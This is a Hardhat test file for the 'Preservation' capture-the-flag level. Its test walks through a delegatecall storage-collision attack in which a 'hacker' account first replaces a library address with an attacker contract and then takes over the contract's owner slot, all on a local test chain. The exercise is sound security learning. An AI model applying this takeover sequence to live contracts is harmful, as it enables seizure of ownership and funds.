import {loadFixture} from "@nomicfoundation/hardhat-toolbox/network-helpers"
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Level 16 - Preservation contract hack", () => {
    async function setUp() {
        const [owner, hacker] = await ethers.getSigners();

        const PreservationContract = await ethers.getContractFactory("Preservation");
        const LibraryContract = await ethers.getContractFactory("LibraryContract");

        const libraryOne = await LibraryContract.deploy();
        const libraryTwo = await LibraryContract.deploy();
        const preservation = await PreservationContract.deploy(await libraryOne.getAddress(), await libraryTwo.getAddress());

        const PreservationHackerContract = await ethers.getContractFactory("PreservationHack");
        const preservationHack = await PreservationHackerContract.deploy();

        return {owner, hacker, preservation, preservationHack, libraryOne, libraryTwo};
    };
    
    describe("When hacking", () => {
        it("After setting timeZone1Library to the preservation hack contract, a call to setFirstTime() should modify the owner address", async() => {
            const {owner, hacker, preservation, preservationHack, libraryOne, libraryTwo} = await loadFixture(setUp);
            const preservationHackAddr = await preservationHack.getAddress();

            expect(await preservation.timeZone1Library()).to.equal(await libraryOne.getAddress());
            expect(await preservation.owner()).to.equal(owner.address);

            await preservation.connect(hacker).setFirstTime(preservationHackAddr);
            expect(await preservation.timeZone1Library()).to.equal(preservationHackAddr);

            await preservation.connect(hacker).setFirstTime(hacker.address);
            expect(await preservation.owner()).to.equal(hacker.address);
        });
    });
});